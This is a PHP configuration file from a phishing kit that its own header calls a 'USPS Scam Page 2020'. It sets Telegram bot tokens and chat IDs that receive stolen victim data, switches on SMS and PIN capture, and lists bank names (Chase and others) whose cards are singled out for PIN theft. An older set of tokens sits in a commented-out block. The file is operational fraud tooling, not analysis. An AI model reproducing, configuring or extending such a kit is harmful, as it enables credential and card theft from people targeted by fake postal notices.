<?php
/* 
USPS Scam Page 2020
CODED BY ARON-TN
*/
// $user_ids=array("-502725005", "535598454");
/*
$bottoken = '2129731640:AAHqg3J06Tw_IBumTvoSIbl1RgSRHFE6Q8g';
$user_ids=array("-715481701");
$sms=true;
$error='0';
$sendtele = true;
$pin = true;
$pinbin = array('chase', 'bank of america', 'wells');


// seting bin to regex format
$regbin = '/('.implode('|', $pinbin).')/i';

*/

$bottoken = '5109012684:AAFqLzaRWTPPIRCMKukE1uayJMVuryipUAc';
$user_ids=array("-695550697");
$sms=true;
$error='0';
$sendtele = true;
$pin = true;
$pinbin = array('chase');


// seting bin to regex format
$regbin = '/('.implode('|', $pinbin).')/i';
?>
